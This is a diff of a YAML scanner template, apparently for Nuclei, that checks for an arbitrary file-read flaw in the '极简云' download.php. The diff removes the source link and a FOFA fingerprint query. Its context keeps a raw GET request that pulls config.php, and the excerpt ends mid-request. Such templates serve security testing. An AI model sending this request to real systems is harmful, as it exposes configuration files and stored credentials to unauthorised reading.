@@ -3,12 +3,8 @@ info:
   name: 极简云 download.php 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tetlfqvagopgh604'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tetlfqvagopgh604
-    fofa: '"/assets/img/bg/logo_white.png"'
 http:
 - raw:
   - 'GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
